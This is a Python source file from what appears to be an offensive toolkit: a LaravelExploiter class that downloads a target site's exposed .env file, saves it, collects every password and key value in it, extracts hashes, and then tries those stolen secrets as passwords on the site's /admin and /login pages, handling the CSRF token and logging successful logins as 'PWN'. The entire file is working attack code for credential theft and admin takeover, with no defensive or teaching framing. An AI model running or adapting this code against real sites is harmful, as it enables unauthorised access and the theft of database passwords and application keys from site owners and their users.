from bs4 import BeautifulSoup
from engines.utils import log, get_session, get_target_dir
import os

class LaravelExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = get_session()
        self.passwords = []

    def dump_env(self):
        url = f"{self.target_url}/.env"
        log(f"Checking for .env file at {url}")
        try:
            r = self.session.get(url, timeout=10)
            if r.status_code == 200 and "DB_PASSWORD" in r.text:
                # حفظ نسخة في مجلد الهدف
                ip = self.target_url.split("//")[1].split(":")[0].split("/")[0]
                t_dir = get_target_dir(ip)
                with open(f"{t_dir}/env_backup.txt", "w", encoding="utf-8") as f:
                    f.write(r.text)
                
                log(f"Successfully dumped .env file! Saved to {t_dir}/env_backup.txt", "PWN")
                for line in r.text.splitlines():
                    if "=" in line:
                        key, val = line.split("=", 1)
                        if "PASS" in key or "KEY" in key:
                            self.passwords.append(val.strip())

                from engines.hash_extractor import extract_from_env_file, write_hashes_file
                env_hashes = extract_from_env_file(f"{t_dir}/env_backup.txt")
                if env_hashes:
                    write_hashes_file(ip, env_hashes)

                return True
        except: pass
        return False

    def attempt_admin_login(self, emails):
        log("Attempting Laravel Admin Login (with CSRF handling)...")
        login_paths = ["/admin", "/login"]
        for path in login_paths:
            url = self.target_url + path
            try:
                res = self.session.get(url)
                soup = BeautifulSoup(res.text, 'html.parser')
                token = soup.find('input', {'name': '_token'})['value']
                
                for email in emails:
                    for pwd in self.passwords:
                        payload = {"_token": token, "email": email, "password": pwd}
                        post_res = self.session.post(url, data=payload, allow_redirects=True)
                        if "dashboard" in post_res.url.lower():
                            log(f"Laravel Login Success: {email}:{pwd}", "PWN")
                            return True
            except: pass
        return False
